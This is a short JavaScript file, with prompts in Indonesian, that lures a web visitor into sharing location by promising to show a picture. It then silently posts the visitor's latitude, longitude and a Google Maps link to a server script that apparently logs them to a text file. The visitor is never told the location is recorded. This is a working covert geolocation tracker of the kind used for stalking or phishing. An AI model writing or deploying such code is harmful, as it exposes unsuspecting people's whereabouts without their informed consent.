function getLocation() {
  if (navigator.geolocation) {
    var permission = confirm("Ingin Melihat Gambar?");
    if (permission) {
      navigator.geolocation.getCurrentPosition(showPosition, error);
    } else {
      alert("Akses lokasi ditolak. Fitur tidak dapat digunakan.");
    }
  } else {
    alert("Geolocation is not supported by this browser.");
  }
}

function showPosition(position) {
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;
  var locationEl = document.getElementById("location");
  var googleMapsUrl = "https://www.google.com/maps?q=" + latitude + "," + longitude;
  var locationLink = document.getElementById("locationLink");
  locationLink.href = googleMapsUrl;
  locationLink.style.display = "inline";
  var image = document.getElementById("image");
image.style.display = "block"; 

var formData = new FormData();
formData.append("latitude", latitude);
formData.append("longitude", longitude);
formData.append("google_maps_url", googleMapsUrl);

// send data to server
var xhr = new XMLHttpRequest();
xhr.open("POST", "save-location.php", true);
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    console.log("Location data saved to .txt file on server");
  }
}
xhr.send(formData);
}

function error(){
  alert("Silahkan Aktifkan Lokasi Untuk Melihat Gambar!");
}

getLocation();